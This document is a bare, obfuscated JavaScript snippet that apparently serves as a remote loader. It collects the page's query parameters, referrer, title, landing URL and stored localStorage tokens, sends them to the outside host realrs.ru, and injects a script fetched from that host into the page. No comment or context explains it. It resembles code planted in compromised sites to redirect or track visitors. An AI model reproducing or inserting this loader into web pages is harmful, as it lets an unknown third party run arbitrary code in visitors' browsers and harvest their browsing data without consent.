(function() {
    var name = '_t494Tnp1nNkf2ssR';
    if (!window._t494Tnp1nNkf2ssR) {
        window._t494Tnp1nNkf2ssR = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://realrs.ru/D8BPT5',
            P_PATH: 'https://realrs.ru/5a901f1/postback',
        };
    }
    const _v7hWhdY94mjKy9bK = localStorage.getItem('config');
    if (typeof _v7hWhdY94mjKy9bK !== 'undefined' && _v7hWhdY94mjKy9bK !== null) {
        var _XJL2HkPqjfSt1HcM = JSON.parse(_v7hWhdY94mjKy9bK);
        var _yk1HbrKxnktfRJrH = Math.round(+new Date()/1000);
        if (_XJL2HkPqjfSt1HcM.created_at + window._t494Tnp1nNkf2ssR.ttl < _yk1HbrKxnktfRJrH) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _Md7TPymcwRz2RWTP = localStorage.getItem('subId');
    var _NRt2chhtfPsmvpRJ = localStorage.getItem('token');
    var _qrvMp7mjQgjqdXKj = '?return=js.client';
        _qrvMp7mjQgjqdXKj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _qrvMp7mjQgjqdXKj += '&se_referrer=' + encodeURIComponent(document.referrer);
        _qrvMp7mjQgjqdXKj += '&default_keyword=' + encodeURIComponent(document.title);
        _qrvMp7mjQgjqdXKj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _qrvMp7mjQgjqdXKj += '&name=' + encodeURIComponent(name);
        _qrvMp7mjQgjqdXKj += '&host=' + encodeURIComponent(window._t494Tnp1nNkf2ssR.R_PATH);
    if (typeof _Md7TPymcwRz2RWTP !== 'undefined' && _Md7TPymcwRz2RWTP && window._t494Tnp1nNkf2ssR.unique) {
        _qrvMp7mjQgjqdXKj += '&sub_id=' + encodeURIComponent(_Md7TPymcwRz2RWTP);
    }
    if (typeof _NRt2chhtfPsmvpRJ !== 'undefined' && _NRt2chhtfPsmvpRJ && window._t494Tnp1nNkf2ssR.unique) {
        _qrvMp7mjQgjqdXKj += '&token=' + encodeURIComponent(_NRt2chhtfPsmvpRJ);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._t494Tnp1nNkf2ssR.R_PATH + _qrvMp7mjQgjqdXKj;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
